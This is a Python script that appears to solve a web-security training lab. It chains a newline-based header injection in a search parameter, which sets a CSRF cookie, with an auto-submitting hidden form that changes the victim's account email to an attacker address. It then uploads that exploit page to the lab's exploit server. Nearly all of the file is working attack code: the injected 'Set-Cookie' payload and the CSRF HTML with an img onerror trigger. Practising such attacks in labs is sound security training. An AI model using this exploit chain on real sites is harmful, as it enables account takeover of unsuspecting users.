import requests
from bs4 import BeautifulSoup

site = 'ac6e1ff41e3685dac087e92f00ea0047.web-security-academy.net'

s = requests.Session()

def getHeadersFromSearch(search_term):
    resp = requests.get(f"https://{site}/?search={search_term}")
    for header in resp.headers.items():
        print(header)

# # getHeadersFromSearch("elafleur")
# # getHeadersFromSearch("elafleur\nfoo: bar")
# getHeadersFromSearch("elafleur\nSet-Cookie: foo=bar")

# s = requests.Session()
# login_url = f'https://{site}/login'
# resp = s.get(login_url)
# soup = BeautifulSoup(resp.text,'html.parser')
# csrf = soup.find('input', {'name':'csrf'}).get('value')
# print(f' csrf field in form field: {csrf}')
# for header in resp.headers.items():
#     print(header)
# for cookie in s.cookies.items():
#     print(cookie)
# s.cookies.clear()
# logindata = {
#     'csrf' : csrf,
#     'username' : 'wiener',
#     'password' : 'peter'
# }
# resp = s.post(login_url, data=logindata)
# print(f"HTTP status code {resp.status_code} with text {resp.text}")
# logindata = {
#     'csrf' : csrf,
#     'username' : 'wiener',
#     'password' : 'peter'
# }
# cookiedata = {
#     'csrf' : csrf
# }
# resp = requests.post(login_url, data=logindata, cookies=cookiedata)
# print(f"HTTP status code {resp.status_code}")
# soup = BeautifulSoup(resp.text,'html.parser')
# csrf = soup.find('input', {'name':'csrf'}).get('value')
# print(f"CSRF token in HTML response is {csrf}")

import urllib
login_url = f'https://{site}/login'
change_email_url = f'https://{site}/my-account'
search_term = urllib.parse.quote("elafleur\nSet-Cookie: csrf=foo")
search_url = f'https://{site}/?search={search_term}'
print(f'URL to embed ({search_url})')

# exploit_html = f'''
#     <form action="{login_url}" method="POST">
#     <input type="hidden" name="username" value="wiener">
#     <input type="hidden" name="password" value="peter">
#     <input type="hidden" name="csrf" value="foo">
#     </form>
#     <img src="{search_url}" onerror="document.forms[0].submit();">
# '''
url = f'https://{site}/'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

change_email_url = f'https://{site}/my-account'
login_url = f'https://{site}/login'
search_term = urllib.parse.quote("mberz2\nSet-Cookie: csrf=foo")
search_url = f'https://{site}/?search={search_term}'
print(f'URL to embed ({search_url})')

exploit_html = f'''
    <form action="https://{site}/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@evil-user.net">
    <input type="hidden" name="csrf" value="foo">
    </form>
    <img src="{search_url}"
    onerror="document.forms[0].submit();">
'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}

resp = s.post(exploit_url, data=formData)
soup = BeautifulSoup(resp.text,'html.parser')
print(soup)
